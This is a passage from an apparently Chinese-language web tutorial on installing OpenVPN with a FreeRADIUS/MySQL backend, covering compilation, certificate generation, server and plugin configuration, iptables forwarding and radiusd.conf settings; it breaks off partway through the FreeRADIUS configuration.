class="token-line" style="color:#393A34"><span class="token plain">wget http://swupdate.openvpn.net/community/releases/openvpn-2.2.0.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget ftp://ftp.freeradius.org/pub/freeradius/freeradius-server-2.1.10.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://sourceforge.net/projects/daloradius/files/daloradius/daloradius0.9-9/daloradius-0.9-9-rc1.tar.gz/download</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://www.nongnu.org/radiusplugin/radiusplugin_v2.1a_beta1.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://sourceforge.net/projects/phpmyadmin/files%2FphpMyAdmin%2F2.11.11.3%2FphpMyAdmin-2.11.11.3-all-languages.tar.bz2/download</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>1.安装lzo-2.0.5  使openvpn支持压缩功能</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf lzo-2.05.tar.gz &amp;&amp;cd lzo-*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./configure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make &amp;&amp; make install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd ..</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>2.安装openvpn服务</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf openvpn-2.2.0.tar.gz &amp;&amp;cd openvpn-*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./configure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make &amp;&amp; make install</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>复制证书生成所需文件</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir /etc/openvpn &amp;&amp; cp easy-rsa /etc/openvpn -r</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>3.安装radiusplugin</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf radiusplugin_v2.1a_beta1.tar.gz &amp;&amp; cd radiusplugin_*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make #将会生成radiusplugin.so 将其cp到/etc/openvpn目录下</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp radiusplugin.cnf /etc/openvpn/conf/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>4.生成服务端所需证书</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /etc/openvpn/easy-rsa/2.0/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi vars   #编辑变量</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.  vars  #source命令使变量生效</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./clean-all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-ca  #ca.crt ---Root CA证书，用于签发Server和Client证书</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-key-server server #server.crt server.key-创建并签发VPN Server使用的CA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-key client1 #client1.crt client1.key #如果客户端需要使用证书方式认证则需要这个东东，创建客户端证书，一个客户端一个证书</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-key client2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-dh  #dh1024.pem--生成Diffie-Hellman文件 ,TLS用到</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">openvpn --genkey --secret keys/ta.key #生成tls auth key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>复制证书文件到配置文件目录</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir /etc/openvpn/conf &amp;&amp; cd keys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp ca.crt server.crt server.key dh1024.pem ta.key /etc/openvpn/conf/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tar czf clientkey.tgz ca.crt client1.crt client1.key # 如果客户端使用证书方式认证则这里需要这个东东，本文介绍的radius方式不需要。 </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>5.编辑openvpn服务端配置文件</p><p>vi /etc/openvpn/conf/server.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">port 1194</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proto udp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dev tap   #TAP设备是一块虚拟的以太网卡，TUN设备是一个虚拟的点到点IP链接。 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ca /etc/openvpn/conf/ca.crt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cert /etc/openvpn/conf/server.crt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">key /etc/openvpn/conf/server.key  # This file should be kept secret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dh /etc/openvpn/conf/dh1024.pem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">server 10.8.0.0 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ifconfig-pool-persist ipp.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push &quot;redirect-gateway def1 bypass-dhcp&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push &quot;dhcp-option DNS 10.8.0.1&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push &quot;dhcp-option DNS 208.67.222.222&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push &quot;dhcp-option DNS 208.67.220.220&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">client-to-client</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">keepalive 10 120</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tls-auth /etc/openvpn/conf/ta.key 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">comp-lzo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user nobody</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">group nobody</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persist-key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persist-tun</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">status openvpn-status.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">verb 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">client-to-client #如果让Client之间可以相互看见，去掉本行的注释掉，否则Client之间无法相互访问</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">;duplicate-cn  #是否允许一个User同时登录多次，去掉本行注释后可以使用同一个用户名登录多次</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">client-cert-not-required #客户端不使用CA证书验证</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">username-as-common-name #使用客户提供的UserName作为Common Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">;max-clients 1000  #最大连接数</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">plugin /etc/openvpn/radiusplugin.so /etc/openvpn/conf/radiusplugin.cnf #radius插件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">script-security 3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>编辑radius插件配置文件</p><p>vi /etc/openvpn/conf/radiusplugin.cnf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">NAS-Identifier=OpenVpn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service-Type=5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Framed-Protocol=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAS-Port-Type=5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAS-IP-Address=127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OpenVPNConfig=/etc/openvpn/conf/server.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">subnet=255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwriteccfiles=true</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nonfatalaccounting=false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # The UDP port for radius accounting.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        acctport=1813</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # The UDP port for radius authentication.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        authport=1812</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # The name or ip address of the radius server.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        name=127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # How many times should the plugin send the if there is no response?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        retry=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # How long should the plugin wait for a response?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        wait=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # The shared secret.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sharedsecret=testpw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动openvpn</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/sbin/openvpn  --cd /etc/openvpn \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> --config /etc/openvpn/conf/server.conf &amp;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>配置内核路由转发和iptables</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sysctl -w net.ipv4.ip_forward=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A INPUT -p udp  --dport 1194 -j ACCEPT</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>6.安装freeradius</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar  xf  freeradius-server-2.1.10.tar.bz2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd  freeradius-*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./configure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make &amp;&amp; make install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi /etc/ld.so.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#加入:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/lib</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#然后</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ldconfig</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动mysql</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/init.d/mysqld start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#初始化mysql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql_secure_installation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql -uroot -p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">create database radius;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd /usr/local/etc/raddb/sql/mysql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql -uroot -p radius &lt; schema.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql -uroot -p &lt; admin.sql</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>配置radiusd</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /usr/local/etc/raddb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi radiusd.conf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">prefix = /usr/local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exec_prefix = ${prefix}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sysconfdir = ${prefix}/etc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">localstatedir = ${prefix}/var</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sbindir = ${exec_prefix}/sbin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logdir = ${localstatedir}/log/radius</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">raddbdir = ${sysconfdir}/raddb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">radacctdir = ${logdir}/radacct</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name = radiusd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">confdir = ${raddbdir}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run_dir = ${localstatedir}/run/${name}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_dir = ${raddbdir}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libdir = ${exec_prefix}/lib</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pidfile = ${run_dir}/${name}.pid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">max_request_time = 30</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cleanup_delay = 5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">max_requests = 1024</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listen {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        type = auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ipaddr = *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        port = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listen {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ipaddr = *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        port = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        type = acct</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hostname_lookups = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">allow_core_dumps = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">regular_expressions     = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extended_expressions    = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        destination = files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        file = ${logdir}/radius.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        syslog_facility = daemon</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        stripped_names = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        auth = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        auth_badpass = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        auth_goodpass = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">checkrad = ${sbindir}/checkrad</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">security {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_attributes = 200</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        reject_delay = 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        status_server = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proxy_requests  = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$INCLUDE proxy.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$INCLUDE clients.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">thread pool {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        start_servers = 5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_servers = 32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        min_spare_servers = 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_spare_servers = 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_requests_per_server = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">modules {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE ${confdir}/modules/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE eap.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE sql.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE sql/mysql/counter.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE sqlippool.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">instantiate {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   